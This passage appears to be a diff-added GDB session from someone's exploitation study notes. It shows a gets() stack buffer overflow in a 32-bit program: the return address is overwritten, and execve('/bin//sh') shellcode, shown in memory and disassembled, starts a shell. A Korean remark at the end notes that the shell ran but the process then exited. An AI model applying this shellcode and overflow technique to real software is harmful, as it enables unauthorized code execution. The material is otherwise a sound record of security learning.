+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x0804841a in main ()
+(gdb) 
+0x0804841b in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+=> 0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048420 in main ()
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd4	0xffffcbd4
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048420	0x8048420 <main+21>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) ni
+0x08048423 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+=> 0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048423	0x8048423 <main+24>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/150x $esp
+0xffffcbd8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbe8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc18:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc28:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc38:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc48:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc58:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc68:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc78:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc88:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc98:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcca8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccd8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd58:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd68:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd78:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd88:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd98:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcda8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdd8:	0x41414141	0xffffcde0	0xe1f7c931	0x2f2f6850
+0xffffcde8:	0x2f686873	0x896e6962	0xcd0bb0e3	0x00000080
+0xffffcdf8:	0xf7fb5000	0xf7ffdc04	0xf7ffd000	0x00000000
+0xffffce08:	0xf7fb5000	0xf7fb5000	0x00000000	0x7aafa0bb
+0xffffce18:	0x469f8eab	0x00000000	0x00000000	0x00000000
+0xffffce28:	0x00000001	0x08048310
+(gdb) x/8i 0xffffcde0
+   0xffffcde0:	xor    ecx,ecx
+   0xffffcde2:	mul    ecx
+   0xffffcde4:	push   eax
+   0xffffcde5:	push   0x68732f2f
+   0xffffcdea:	push   0x6e69622f
+   0xffffcdef:	mov    ebx,esp
+   0xffffcdf1:	mov    al,0xb
+   0xffffcdf3:	int    0x80
+(gdb) ni
+0x08048428 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+=> 0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048429 in main ()
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcddc	0xffffcddc
+ebp            0x41414141	0x41414141
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048429	0x8048429 <main+30>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcddc:	0xffffcde0
+(gdb) si
+0xffffcde0 in ?? ()
+(gdb) x/8i 0xffffcde0
+=> 0xffffcde0:	xor    ecx,ecx
+   0xffffcde2:	mul    ecx
+   0xffffcde4:	push   eax
+   0xffffcde5:	push   0x68732f2f
+   0xffffcdea:	push   0x6e69622f
+   0xffffcdef:	mov    ebx,esp
+   0xffffcdf1:	mov    al,0xb
+   0xffffcdf3:	int    0x80
+(gdb) si
+0xffffcde2 in ?? ()
+(gdb) 
+0xffffcde4 in ?? ()
+(gdb) 
+0xffffcde5 in ?? ()
+(gdb) 
+0xffffcdea in ?? ()
+(gdb) 
+0xffffcdef in ?? ()
+(gdb) 
+0xffffcdf1 in ?? ()
+(gdb) 
+0xffffcdf3 in ?? ()
+(gdb) 
+process 1576 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: Function "main" not defined.
+[Inferior 1 (process 1576) exited normally]
+(gdb) 
+
+
+
+=> 마지막에 종료는 되었지만, shell은 실행이 되었다. 왜 종료되는지는 재확인 필요.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
